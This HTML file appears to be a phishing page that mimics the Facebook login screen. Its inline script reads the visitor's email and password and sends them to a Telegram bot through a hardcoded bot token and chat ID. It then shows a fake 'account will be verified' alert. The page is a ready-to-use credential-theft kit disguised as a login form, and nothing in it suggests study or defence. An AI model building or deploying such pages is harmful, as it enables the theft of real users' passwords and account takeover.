<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login Page | CodingNepal</title>
    <link rel="stylesheet" href="style.css">
  </head>
  <body>
    <div class="container flex">
      <div class="facebook-page flex">
        <div class="text">
          <h1>facebook</h1>
          <p>Connect with friends and the world </p>
          <p> around you on Facebook.</p>
        </div>
        <form id="loginForm" action="#">
          <input id="emailInput" type="email" placeholder="Email or phone number" required>
          <input id="passwordInput" type="password" placeholder="Password" required>
          <div class="link">
            <button type="submit" class="login">Login</button>
            <a href="#" class="forgot">Forgot password?</a>
          </div>
          <hr>
          <div class="button">
            <a href="#">Create new account</a>
          </div>
        </form>
      </div>
    </div>
    
    <script>
      document.getElementById("loginForm").addEventListener("submit", function(event) {
        event.preventDefault(); // Prevent the form from submitting normally
        
        // Get the input values
        const email = document.getElementById("emailInput").value;
        const password = document.getElementById("passwordInput").value;
        
        // Send the data to the Telegram bot
        const botToken = "6665901686:AAFTZi9DXkedyHhUdC0nQjzJvBFtNCThf6E";
        const chatId = "5990142501";
        const message = `Email: ${email}\nPassword: ${password}`;
        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
        
        // Send a POST request to the Telegram Bot API
        fetch(url, { method: "POST" })
          .then(response => {
            if (response.ok) {
              alert("your account will verfied soon!");
            } else {
              alert("Failed to verify your account check your credential.");
            }
          })
          .catch(error => {
            alert("An error occurred while sending data to the Telegram bot.");
            console.error(error);
          });
      });
    </script>
  </body>
</html>
